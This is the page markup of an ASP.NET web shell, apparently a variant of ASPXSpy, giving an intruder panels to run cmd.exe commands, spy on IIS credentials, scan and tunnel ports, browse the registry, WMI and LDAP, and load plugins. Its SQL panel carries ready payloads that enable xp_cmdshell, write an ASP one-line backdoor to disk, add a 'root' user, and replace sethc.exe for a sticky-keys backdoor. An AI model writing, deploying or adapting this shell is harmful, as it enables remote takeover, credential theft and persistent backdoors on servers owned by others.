	<div runat="server" id="Bin_Div_IISSpy" visible="false" enableviewstate="false">
	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
		<asp:Table ID="ETable_Sp" runat="server" Width="100%" CellSpacing="0">
			<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
		</asp:Table>
	</table>
	</div>
	<%--Process--%>
	<div runat="server" id="Bin_Div_Process" visible="false" enableviewstate="false">
	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
		<asp:Table ID="Bin_Table_Process" runat="server" Width="100%" CellSpacing="0" >
			<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>Priority</asp:TableCell><asp:TableCell>Action</asp:TableCell></asp:TableRow>
		</asp:Table>
	</table>
	</div>
	<%--CmdShell--%>
	<div runat="server" id="Bin_Div_Cmd">
	 <p>CmdPath:<br/>
	 <input class="input" runat="server" id="Bin_TextBox_CmdPath" type="text" size="100" value="c:\windows\system32\cmd.exe"/>
	 </p>
	 Argument:<br/>
	 <input class="input" runat="server" id="Bin_TextBox_CmdArg" value="/c Set" type="text" size="100"/> <asp:Button ID="Bin_Button_CmdExec" CssClass="bt" runat="server" Text="Submit" OnClick="btnEdoCik"/>
	 <div id="Bin_Div_CmdRes" runat="server" visible="false" enableviewstate="false">
	 </div>
	</div>
	<%--Services--%>
	<div runat="server" id="Bin_Div_Services" visible ="false" enableviewstate="false">
	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
		<asp:Table ID="Bin_Table_Serviecs" runat="server" Width="100%" CellSpacing="0" >
			<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Name</asp:TableCell><asp:TableCell>Path</asp:TableCell><asp:TableCell>State</asp:TableCell><asp:TableCell>StartMode</asp:TableCell></asp:TableRow>
		</asp:Table>
	</table>
	</div>
	<%--Sysinfo--%>
	<div runat="server" id="Bin_Div_Sysinfo" visible="false" enableviewstate="false">
	<hr style=" border: 1px solid #ddd;height:0px;"/>
	<ul class="info" id="Bin_Ul_Sys" runat="server"></ul>
	<h2 id="Bin_H2_Mac" runat="server"></h2>
	<hr style=" border: 1px solid #ddd;height:0px;"/>
	<ul class="info" id ="Bin_Ul_NetConfig" runat="server"></ul>
	<h2 id="Bin_H2_Driver" runat="server"></h2>
	<hr style=" border: 1px solid #ddd;height:0px;"/>
	<ul class="info" id ="Bin_Ul_Driver" runat="server"></ul>
	</div>
	<%--UserInfo--%>
	<div runat="server" id="Bin_Div_Userinfo" visible="false" enableviewstate="false">
	<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
		<asp:Table ID="Bin_Table_User" runat="server" Width="100%" CellSpacing="0" >
		</asp:Table>
	</table>
	</div>
	<%--Reg--%>
	<div id="zemfosdfml" runat="server">
	<p>Registry Path : <asp:TextBox id="Bin_Text_Regread" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="Bin_Button_RegGo" runat="server" Text="Go" CssClass="bt" onclick="lekfdnKKEZSA"/></p>
	<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
		<asp:Table ID="Bin_Table_Reg" runat="server" Width="100%" CellSpacing="0" >
			<asp:TableRow CssClass="alt1"><asp:TableCell ColumnSpan="2" id="bnRggroot_Href"></asp:TableCell></asp:TableRow>
			<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">Value</asp:TableCell></asp:TableRow>
		</asp:Table>
	</table>
	</div>
	<%--PortScan--%>
	<div id="zemfokeUQ" runat="server">
	<p>
	IP : <asp:TextBox id="Bin_TextBox_Sip" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> Port : <asp:TextBox id="Bin_TextBox_Sport" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="Bin_Button_Scan" runat="server" Text="Scan" CssClass="bt" OnClick="lkkEIU"/>
	</p>
	<div id="Bin_Label_Scanres" runat="server" visible="false" enableviewstate="false"></div>
	</div>
	<%--DataBase--%>
	<div id="Bin_Div_Data" runat="server">
	<div id='zcg_divresize' style="width:1000px;overflow:auto">
	<p>ConnString : <asp:TextBox id="Bin_TextBox_ConnStr" style="width:70%;margin:0 8px; height:17px" CssClass="input" runat="server"/><asp:DropDownList runat="server" CssClass="list" ID="Bin_List_Connstr" AutoPostBack="True" OnSelectedIndexChanged="cespludurYT" ><asp:ListItem></asp:ListItem><asp:ListItem Value="server=localhost,1433;UID=sa;PWD=sa;database=master">MSSQL</asp:ListItem><asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=d:\database.mdb">OleDb</asp:ListItem></asp:DropDownList><asp:Button ID="Bin_Button_Conn" runat="server" Text="Go" CssClass="bt" OnClick="cespludNEE"/></p></div>
	<div id="Bin_Div_DBPanel" runat="server">
	<div id="Bin_Div_Dbinfo" runat="server"></div>
	<div id="Bin_Div_Dblist" runat="server">
	Please select a database : <asp:DropDownList runat="server" ID="Bin_List_DB" AutoPostBack="True" OnSelectedIndexChanged="cespludurYT" CssClass="list"></asp:DropDownList>
	SQLExec : <asp:DropDownList runat="server" ID="Bin_List_Exec" AutoPostBack="True" OnSelectedIndexChanged="cespludurYT" CssClass="list"><asp:ListItem Value="">-- SQL Server Execc --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add xp_cmdshell</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];">DatabaseBackup</asp:ListItem><asp:ListItem>SA_Upfile</asp:ListItem><asp:ListItem>FileCopy</asp:ListItem></asp:DropDownList> 
	<asp:Button runat="server" ID="Bin_Button_Show" CssClass="bt" Text="Show Tables" OnClick="cespludurYT"/>
	</div>
	<table width="100%" border="0" cellpadding="0" cellspacing="0"><tr><td> Run SQL </td></tr><tr><td><textarea id="Bin_Textarea_Query" class="area" style="overflow:auto;" runat="server" rows="5" cols="100"></textarea></td></tr><tr><td>
<asp:Button runat="server" ID="Bin_Button_Query" CssClass="bt" Text="Query" onclick="lkkvnekL"/> 
<asp:Button runat="server" ID="Bin_Button_Export" CssClass="bt" Text="Export" onclick="lkkvnekzeo" Visible="false" EnableViewState="false"/></td></tr></table>

<div id="Bin_Div_saupfile" runat="server" visible="false" enableviewstate="false">
    <table width="70%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
			<tr align="center">			
			<td style="width:15%" align="left">UpFile : <input id="Bin_TextBox_SaFile" class="input" runat="server" type="file" style="height:22px" size="30"/></td>
			<td style="width:30%" align="left">SavePath : <input id="Bin_TextBox_SavePath" class="input" runat="server" type="text" style="height:16px" size="30"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button 
                    ID="zemfokemMLM" runat="server" CssClass="bt" 
                    onclick="lkkvnekzexxX" Text="Sa_UpFile" />
                                            </td>
			
			</tr>
			</table></div>
			<div id="zemfokemMdfedeeLL" runat="server" visible="false" enableviewstate="false">
<table width="70%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:10%" align="left">Source : <input id="Bin_TextBox_Source" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\explorer.exe"/></td>
<td style="width:20%" align="left">Target : <input id="zemfokemMdfede" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\system32\sethc.exe"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server" 
                    ID="Bin_Button_CabCopy" CssClass="bt" Text="CabCopy" 
        onclick="lkkvLKve"  />&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server" 
                    ID="Bin_Button_FsoCopy" CssClass="bt" Text="FsoCopy" 
        onclick="lkkvnekzexxXE"/></td>
</tr>
</table>
</div>
	<div style="overflow:auto;" >
	<p>
	<asp:DataGrid runat="server" ID="zemfokemMdfe" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" EnableViewState="false"></asp:DataGrid>
	</p>
	</div>
	</div>
	</div>
	<%--PortMap--%>
	<div id="zemfokemM" runat="server">
		<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
			<tr align="center">
			<td style="width:5%"></td>
			<td style="width:20%" align="left">L Ip : <input class="input" runat="server" id="zemfoksdkKE" type="text" size="20" value="127.0.0.1"/></td>
			<td style="width:20%" align="left">L Port : <input class="input" runat="server" id="esRvE" type="text" size="20" value="3389"/></td>
			<td style="width:20%" align="left">Remote Ip: <input class="input" runat="server" id="esRcezeOU" type="text" size="20" value="www.google.com"/></td>
			<td style="width:20%" align="left">Remote Port: <input class="input" runat="server" id="esRceze" type="text" size="20" value="80"/></td></tr>
			<tr align="center"><td colspan="5"><br/><asp:Button ID="Bin_Button_MapPort" CssClass="bt" runat="server" Text="Start" OnClick="pazelestu"/><asp:Button ID="zemfoksdVERL" CssClass="bt" runat="server" Text="ListAll" OnClick="pOZiuCC"/><asp:Button ID="zemfoksPZM" CssClass="bt" runat="server" Text="ClearAll" OnClick="pazelesPM"/></td></tr></table>
		<asp:Table ID="zemfokNEK" runat="server" Width="100%" CellSpacing="0" Visible=false>
			<asp:TableRow CssClass="head"><asp:TableCell Width="20%">ID</asp:TableCell><asp:TableCell Width="20%">Remote</asp:TableCell><asp:TableCell Width="20%">Local</asp:TableCell><asp:TableCell Width="20%">Status</asp:TableCell><asp:TableCell Width="20%">Action</asp:TableCell></asp:TableRow>
		</asp:Table>
			</div>
	<%--Search--%>
	<div id="Bin_Div_Search" runat="server">
		<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
			<tr align="center">
				<td style="width:20%" align="left">Keywordd</td>
				<td style="width:60%" align="left"><textarea id="bnTESStSe" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
				<td style="width:20%" align="left"><input type="checkbox" runat="server" id="esRcezlwo" value="1"/> Use Regex</td>
			</tr>
			<tr align="center">
				<td style="width:20%" align="left">Replace par</td>
				<td style="width:60%" align="left"><textarea id="Bin_TextArea_ReplaceAs" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
				<td style="width:20%" align="left"><input type="checkbox" runat="server" id="esRcezlwqK"/> Replace</td>
			</tr>
			<tr align="center">
				<td style="width:20%" align="left">Search FileTyp</td>
				<td style="width:60%" align="left"><input type="text" runat="server" class="input" id="bnTESSteff" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/></td>
				<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Bin_Search_Mod" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name" Selected="True">File Name</asp:ListItem><asp:ListItem Value="content">File Content</asp:ListItem></asp:DropDownList></td>
			</tr>
			<tr align="center">
				<td style="width:20%" align="left">Pathh</td>
				<td style="width:60%" align="left"><input type="text" class="input" id="Bin_Search_Path" runat="server" style="width:100%" /></td>
				<td style="width:20%" align="left"><asp:Button CssClass="bt" id="Bin_Button_SearchSubmit" runat="server" onclick="lefidUU" Text="Start" /></td>
			</tr>
		</table>
		<br/>
		<br/>
		<asp:Table ID="eBinezlwqKV" runat="server" Width="100%" CellSpacing="0" >
			<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
		</asp:Table>
	</div>
	<%--WmiTools--%>
	<div id="Bin_Div_WmiTools" runat="server">
	<div id='zcg_divresize' style="width:1000px;overflow:auto">
	<p>Computer:<asp:TextBox id="zcg_txbWmiComputer" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="" runat="server"/>Username:<asp:TextBox id="zcg_txbWmiUserName" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="" runat="server"/>Password:<asp:TextBox id="zcg_txbWmiPassword" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="" runat="server"/>Namespace:<asp:TextBox id="zcg_txbWmiNamespace" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="root\CIMV2" runat="server"/>QueryString : <asp:TextBox id="Bin_TextBox_WmiString" style="width:20%;margin:0 8px; height:17px" CssClass="input" runat="server" Text="select * from win32_process"/>&nbsp;<asp:Button ID="euhAlezlwqKV" runat="server" Text="Query" CssClass="bt" onclick="lkkvLK"/></p></div>
            <div id="Bin_Div_WmiPanel" runat="server">           
	            Result:<br />
	<asp:DataGrid runat="server" ID="euVezlwqKV" HeaderStyle-CssClass="head" BorderWidth="0" 
                    GridLines="None"  EnableViewState="false"></asp:DataGrid>
            </div>
	</div>
	<%--ADS Viewer--%>
	<div id="euhAllezlwVOU" runat="server">
	<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 <tr>
	<td style=" white-space:nowrap"> Path:</td>
	<td style=" width:40%"><input class="input" id="euhAllezlwRE" type="text" style="width:95%;margin:0 8px;" runat="server"/>
	</td>
	<td style=" white-space:nowrap">Filter:</td>
	<td style=" width:15%"><input class="input" id="euhAllezlwo" type="text" style="width:85%;margin:0 8px;" runat="server"/>
	</td>
	<td style=" white-space:nowrap">uName:</td>
	<td style=" width:15%"><input class="input" id="ztxbED" type="text" style="width:85%;margin:0 8px;" runat="server"/>
	</td>
	<td style=" white-space:nowrap">Pasword:</td>
	<td style=" width:15%"><input class="input" id="euhAllezlwa" type="text" style="width:85%;margin:0 8px;" runat="server"/>
	</td>
	<td style=" white-space:nowrap">Type:</td>
	<td style=" width:10%"><input class="input" id="euhtaquoistpS" Value="1" type="text" style="width:85%;margin:0 8px;" runat="server" onClick="show();" /><br/>
	<div id="typediv" style="position:absolute;font-size:9pt; background-color:#e8e8e8;width:145px; display:none;z-index:9999;">
	<input type="checkbox" name="checker" value="0">None</input><br/>
	<input type="checkbox" name="checker" checked="true" value="1">Secure</input><br/>
	<input type="checkbox" name="checker" value="2">SecureSocketsLayer</input><br/>
	<input type="checkbox" name="checker" value="2">Encryption</input><br/>
	<input type="checkbox" name="checker" value="4">ReadonlyServer</input><br/>
	<input type="checkbox" name="checker" value="0x10">Anonymous</input><br/>
	<input type="checkbox" name="checker" value="0x20">FastBind</input><br/>
	<input type="checkbox" name="checker" value="0x40">Signing</input><br/>
	<input type="checkbox" name="checker" value="0x80">Sealing</input><br/>
	<input type="checkbox" name="checker" value="0x100">Delegation</input><br/>
	<input type="checkbox" name="checker" value="0x200">ServerBind</input><br/>
	<input type="button" onclick="hide(true)" style="width:50px;" value="OK"/>
	<input type="button" onclick="hide(false)" style="margin-left:25px;" value="Cancel"/>
	</div>
	<script>
	function show()
	{
	document.getElementById("typediv").style.display="block";return false;
	}
	function hide(isok)
	{
	if(isok)
	{
	var hidvalue=0;
	var clicked=false;
	var checkers=document.getElementsByName("checker");
	for(var i=0;i<checkers.length;i++)
	{
	if(checkers[i].checked){hidvalue|=parseInt(checkers[i].value);clicked=true;}
	}
	document.getElementById("euhtaquoistpS").value=clicked?hidvalue:1;
	}
	document.getElementById("typediv").style.display="none";
	return false;
	}
	</script>
	</td>
	<td style="white-space:nowrap" ><asp:Button ID="euhtaqvois" runat="server" Text="List" CssClass="bt" OnClick="lkkvLKveUTss"/></td>
 </tr>
	</table>
	<table width="100%" border="0" cellpadding="4" cellspacing="0">
	<tr class="alt1"><td style="padding:5px;">
	<div style="float:right;">Schema:<asp:Label id="zcg_lbl_Schema" Text="&nbsp;" runat="server" style=" height:22px,Width:50px"/></div>
	<asp:LinkButton ID="euhtaqoiiEE" runat="server" Text="WinNT" CommandArgument="WinNT:" OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="euhtaqoiiV" runat="server" Text="LocalMachine" CommandArgument="WinNT://"	OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="euhtaqoii" runat="server" Text="LocalShare" CommandArgument="WinNT://127.0.0.1/lanmanserver"	OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="euhtakoii" runat="server" Text="WorkGroup" CommandArgument="WinNT://WORKGROUP"	OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="euhtakoiii" runat="server" Text="CurrentDomain" CommandArgument="WinNT://"	OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="euhtakwaa" runat="server" Text="IIS" CommandArgument="IIS:" OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="euhtakwaae" runat="server" Text="W3SVC" CommandArgument="IIS://LOCALHOST/W3SVC" OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="bnTESSgeDA" runat="server" Text="LDAP" CommandArgument="LDAP:" OnClick="lkkvLKvRR"></asp:LinkButton> |
	<asp:LinkButton ID="bnTESSgves" runat="server" Text="LDAPRootDSE" CommandArgument="LDAP://RootDSE" OnClick="lkkvLKvRR"></asp:LinkButton> 
	</td></tr>
		<asp:Table ID="zcg_tbl_ADSViewer" runat="server" Width="100%" CellSpacing="0" >
			<asp:TableRow CssClass="head"><asp:TableCell Width="20%">Name</asp:TableCell><asp:TableCell Width="10%">Type</asp:TableCell><asp:TableCell Width="15%">Schema</asp:TableCell><asp:TableCell Width="15%">Value</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
		</asp:Table>
	</table>
	</div>
	<%--Plugin Loader--%>
	<div id="zcg_div_Plugin" runat="server">
	Select a File:<input id="zcg_plgFile" class="input" runat="server" type="file" style="height:22px"/><br/><br/><asp:CheckBox ID="bnTESSgae" runat="server" Text="Deflate-Compressed"/>   <asp:CheckBox ID="zcg_chbIsHtml" runat="server" Text="HTML Result"/><br/><br/>TypeName:<br/><asp:TextBox ID="zcg_txbTypeName" runat="server" Size="55" Text="Zcg.Test.AspxSpyPlugins.TestPlugin"></asp:TextBox><br/><br/>MethodName:<br/><asp:TextBox ID="bnTESSgann" runat="server" Size="55" Text="Test"></asp:TextBox><br/><br />Params:<br/><asp:TextBox ID="zcg_txbParams" runat="server" TextMode="1" Height="70" Columns="46"></asp:TextBox><br/><br/><asp:Button ID="zcg_btnplgLoad" CssClass="bt" runat="server" Text="LoadPlugin" OnClick="lkesLKEveeDOG"/>
	<div id="zcg_div_PluginResult" runat="server"></div>
	</div>
		</td></tr></table>
		<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright(C)2021-2022 <a href="http://www.google.com" target="_blank">Yeah</a> All Rights Reserved.</div></div>
		<script>var tmpdiv=document.getElementById('zcg_divresize');var tmpwidth=document.getElementById('Bin_Div_Head').clientWidth+"px";if(tmpdiv){tmpdiv.style.width=tmpwidth;}</script>
		</form>
	</body>
</html>